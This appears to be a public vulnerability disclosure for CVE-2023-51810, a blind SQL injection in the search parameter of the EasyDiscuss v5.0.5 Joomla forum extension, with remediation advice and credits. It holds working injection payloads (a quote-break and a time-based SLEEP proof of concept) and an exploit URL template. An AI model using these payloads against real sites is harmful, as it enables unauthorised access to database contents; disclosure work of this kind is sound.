# CVE-2023-51810

## Description

Blind SQL injection vulnerability in StackIdeas EasyDiscuss v.5.0.5 allows a remote attacker to obtain sensitive information via search parameter in the Users module.

## Product

StackIdeas EasyDiscuss v5.0.5 - [EasyDiscuss - Joomla Forum Discussion Tool - StackIdeas](https://stackideas.com/easydiscuss)

## Remediation

Upgrade to a version >= 5.0.10. Version 5.0.6-5.0.9 not tested due to lack of public available source code.

## Steps

A Blind SQL injection is present on plugin EasyDiscuss (v5.0.5) installed on Joomla:

![image](https://github.com/Pastea/CVE-2023-51810/assets/24623933/4cb53cde-ccbb-47ae-a65a-782c5e0e1cee)

The vulnerability is present on "search" functionality on "users" section, that is also configured to output
SQL error messages when in the injection point is used a payload that can break the query:

Example payload:
```
a'
```


Output:
![image](https://github.com/Pastea/CVE-2023-51810/assets/24623933/bf80fbd3-0adf-40b7-a0e3-c7b825efc279)

As proof of concept, in following example a sleep(2) has been injected, that resulted in a doubled (4 seconds) sleep executed by the server. Any sleep value is doubled by the vulnerable backend:

Example payload (before url-encoding):
```
' OR (SELECT 1337 FROM (SELECT(SLEEP(2)))prime) AND 'a'='a
```

Output:
![image](https://github.com/Pastea/CVE-2023-51810/assets/10105061/07b7c1a8-8785-4bda-a723-795c7b4f7612)



Exploit URL:
> https://xxx.xxx/component/easydiscuss/users?search=[INJECTION_POINT]&option=com_easydiscuss&view=users

## Credits

Andrea Mattiazzo, Giovanni Battista Colonna, Elisabetta Fera
